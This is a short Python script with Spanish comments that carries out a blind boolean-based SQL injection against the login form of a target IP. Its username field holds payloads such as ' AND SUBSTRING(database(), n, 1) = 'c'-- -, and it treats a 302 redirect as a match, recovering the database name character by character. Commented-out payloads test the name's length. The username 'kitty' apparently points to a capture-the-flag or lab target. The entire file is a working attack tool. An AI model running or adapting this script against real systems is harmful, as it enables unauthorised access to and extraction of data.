#!/bin/env/python3
import requests
import sys
from urllib.parse import urljoin

#Medir la longitud de la database:
#sqlip = ' and LENGTH(database())>1-- -

#Encontrar la database:
#' AND SUBSTRING(database(), 1, 1) = '{i}'-- -

ip_addres = sys.argv[1]
url_login = urljoin(f'http://{ip_addres}/', "index.php")

caracter = "abcdefghijklmnopqrstuvwxyz0123456789"
numeros = "123456789"
tmp = ""
#Realizar la solicitud post
with requests.Session() as session:
    for n in numeros:
        for i in caracter:
            #reemplzar el payload en medida de uso
            sqlip = f"' AND SUBSTRING(database(), {n}, 1) = '{i}'-- -"
            #Ingreso de datos al script
            login ={
                'username': 'kitty' + sqlip,
                'password' : 'holamundo'
            }
            respuesta = session.post(url_login,data=login,allow_redirects=False)
            status_code = respuesta.status_code
            if status_code == 302:
                print(f"login full para {i}")
                tmp += i
                print(tmp)
            #Solicitud GET para cerrar sesión (logout.php)
                url_logout = urljoin(f'http://{ip_addres}/', "logout.php")
                logout_respuesta = session.get(url_logout)
                if logout_respuesta.ok:
                    print("cierre exitoso")
                else:
                    print("revisar respuestas")
            else:
                print("sesión no iniciada")